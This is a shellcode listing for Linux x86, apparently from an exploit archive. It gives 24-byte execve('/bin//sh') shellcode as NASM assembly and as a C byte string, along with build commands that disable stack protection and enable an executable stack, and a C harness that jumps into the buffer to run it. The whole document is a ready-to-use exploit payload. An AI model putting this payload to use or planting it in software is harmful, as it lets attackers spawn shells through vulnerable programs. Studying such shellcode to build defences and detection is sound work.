/*
;Title: Linux/x86 - /bin/sh Shellcode
;Author: Touhid M.Shaikh
;Contact: https://github.com/touhidshaikh
;Category: Shellcode
;Architecture: Linux x86
;Description: This shellcode baased on stack method to Execute "/bin//sh".
Length of shellcode is 24 bytes.
;Tested on : 3.2.0-23-generic-pae #36-Ubuntu SMP Tue Apr 10 22:19:09



===COMPILATION AND EXECUTION===

#nasm -f elf32 shell.asm -o shell.o <=== Making Object File

#ld -m elf_i386 shell.o -o shell <=== Making Binary File

#./bin2shell.sh shell <== xtract hex code from the binary(
https://github.com/touhidshaikh/bin2shell)



=================SHELLCODE(INTEL FORMAT)=================

section .text
global _start
_start:
xor eax,eax
cdq
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
push eax
push ebx
mov ecx, esp
mov al,0x0b
int 80h

===================END HERE============================

Compile with gcc with some options.

# gcc -fno-stack-protector -z execstack shell-testing.c -o shell-testing

*/

#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

printf("Shellcode Length:  %d\n", (int)strlen(code));

int (*ret)() = (int(*)())code;

ret();

}